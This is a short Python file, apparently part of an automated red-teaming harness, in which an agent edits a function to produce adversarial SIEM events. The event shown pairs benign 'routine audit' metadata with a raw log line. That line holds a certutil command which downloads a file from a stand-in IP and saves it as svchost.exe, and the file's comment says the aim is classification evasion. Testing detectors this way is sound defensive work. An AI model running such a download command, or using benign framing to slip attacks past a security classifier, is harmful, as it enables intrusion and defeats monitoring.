"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 1: Classification evasion — benign metadata, certutil attack in raw_log
    return {
        "task_type": "system_health_check",
        "severity": "low",
        "siem_event": {
            "title": "Routine Process Audit",
            "source_ip": "10.0.1.50",
            "username": "svc_monitor",
            "hostname": "ws-admin-01",
            "rule_name": "ServiceMonitor",
            "raw_log": (
                "Process=certutil.exe CommandLine='certutil -urlcache -split -f "
                "http://198.51.100.77/update.bin C:\\Temp\\svchost.exe' "
                "User=svc_monitor PID=4832 ParentProcess=cmd.exe"
            ),
        },
    }
